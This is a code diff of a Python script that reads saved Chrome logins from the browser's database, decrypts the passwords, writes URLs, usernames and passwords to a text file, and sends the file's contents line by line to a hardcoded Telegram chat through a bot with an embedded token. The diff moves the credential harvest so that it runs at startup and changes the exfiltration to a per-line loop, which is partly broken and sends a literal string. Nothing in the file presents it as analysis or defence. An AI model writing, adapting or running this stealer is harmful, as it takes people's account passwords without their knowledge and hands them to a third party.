@@ -1,7 +1,6 @@
 from Crypto.Cipher import AES
 import os.path
 import os
-import logging
 import asyncio
 from aiogram import Bot, Dispatcher, executor, types
 import json
@@ -11,6 +10,8 @@ import win32crypt
 import schedule
 import shutil
 from datetime import timezone, datetime, timedelta
+import sys
+from aiogram.types import InputFile
 
 bot = Bot(token='1645152567:AAHfc_DhZDuOn3-iloEI1UbfF78Z8yNjoAU')
 dp = Dispatcher(bot)
@@ -69,12 +70,10 @@ def main():
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
     # перебор всех строк
     for row in cursor.fetchall():
-        origin_url = row[0]
         action_url = row[1]
         username = row[2]
         password = decrypt_password(row[3], key)       
         if username or password:
-            f.write(f"\nOrigin URL: {origin_url}" + '\n')
             f.write(f"Action URL: {action_url}" + '\n')
             f.write(f"Username: {username}" + '\n')
             f.write(f"Password: {password}" + '\n')
@@ -87,12 +86,49 @@ def main():
     except:
         pass
 
+def readlines():
+    i = 0
+    n = int(countlines())
+    with open("text.txt") as file:
+        for j in range(1, n // 50 ):
+            for i in range(1, 51):
+                while i != 50:
+                    line = file.readline()
+                    i += 1
+                    if not line:
+                        break
+                    print(line.strip())
+                j += 1
+            
+
+def countlines():
+    lines = 0
+    with open("text.txt") as file:
+        while True:
+            line = file.readline()
+            lines += 1
+            if not line:
+                break
+    return int(lines)
+
 async def scheduled():
-    with open(r"text.txt", 'rb') as file:
-        await bot.send_message (715341565, file.read())
+    n = countlines()
+    with open("text.txt") as file:
+        for j in range(1, n // 50 ):
+            for i in range(1, 51):
+                while i != 50:
+                    line = file.readline()
+                    i += 1
+                    await bot.send_message(715341565, line.strip())
+                    if not line:
+                        break
+                    await bot.send_message(715341565, "line.strip()")   
+                j += 1
         
 if __name__ == "__main__":
+    main()
     loop = asyncio.get_event_loop()
     loop.create_task(scheduled())
     executor.start_polling(dp, skip_updates=True)
-    main()
+    ##sys.exit(0)
+    
